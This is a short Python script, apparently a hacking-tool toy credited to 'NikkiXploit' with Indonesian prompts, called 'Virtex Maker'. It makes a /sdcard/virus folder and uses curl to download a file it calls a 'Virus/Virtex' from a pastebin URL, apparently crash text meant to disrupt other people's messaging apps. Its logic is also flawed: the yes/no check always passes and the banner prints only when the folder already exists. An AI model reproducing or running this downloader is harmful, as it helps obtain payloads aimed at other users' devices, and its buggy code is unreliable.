#!/usr/bin/python
import os,sys

def main():
    try:
        os.mkdir('/sdcard/virus')
    except OSError:
        pass
        print('\nVirtex Maker By NikkiXploit')
        print('\nKetik Y bila ingin melanjutkan')
    w = input ('pilih:')
    
    if 'Y' or 'y' in w: 
        print ('\033[0;32m sedang membuat...')
        os.system('cd /sdcard/virus;curl -o virtex.txt https://pastebin.com/raw/x73H685M')
        print('\033[37;1m Tersimpan di ~> sdcard/virus/virtex.txt')
        a = input ('\nSukses, Virus/Virtex Tersimpan Di Folder Virus \n [Ketik Enter Untuk Keluar]')
    else:
        print('command not found!')
        os.sys.exit()
if __name__=='__main__':
    main()
